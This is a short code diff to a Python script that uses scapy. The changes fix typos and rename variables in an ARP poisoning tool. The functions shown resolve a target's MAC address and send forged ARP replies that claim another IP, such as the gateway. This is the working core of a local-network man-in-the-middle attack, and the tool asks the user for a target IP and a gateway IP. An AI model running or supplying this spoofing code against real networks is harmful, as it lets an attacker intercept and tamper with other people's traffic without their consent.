@@ -6,19 +6,19 @@ import optparse
 def get_mac_address(ip):
     arp_request_packet = scapy.ARP(pdst=ip)
     #scapy.ls(scapy.ARP())
-    brodcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+    broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
     #scapy.ls(scapy.Ether())
-    combined_packet = brodcast_packet/arp_request_packet
+    combined_packet = broadcast_packet/arp_request_packet
     answered_list = scapy.srp(combined_packet, timeout=1,verbose=False)[0]
 
     return answered_list[0][1].hwsrc
 
 
-def arp_poisoning(target_ip,poisoned_ip):
+def arp_poisoning(target_ip_address,poisoned_ip):
 
-    target_mac = get_mac_address(target_ip)
+    target_mac = get_mac_address(target_ip_address)
 
-    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
+    arp_response = scapy.ARP(op=2,pdst=target_ip_address,hwdst=target_mac,psrc=poisoned_ip)
     scapy.send(arp_response,verbose=False)
     #scapy.ls(scapy.ARP())
 
@@ -39,7 +39,7 @@ def get_user_input():
 
     options = parse_object.parse_args()[0]
 
-    if not options.target_ip_adress:
+    if not options.target_ip_address:
         print("Enter a Target IP Address")
 
     if not options.gateway_ip_address:
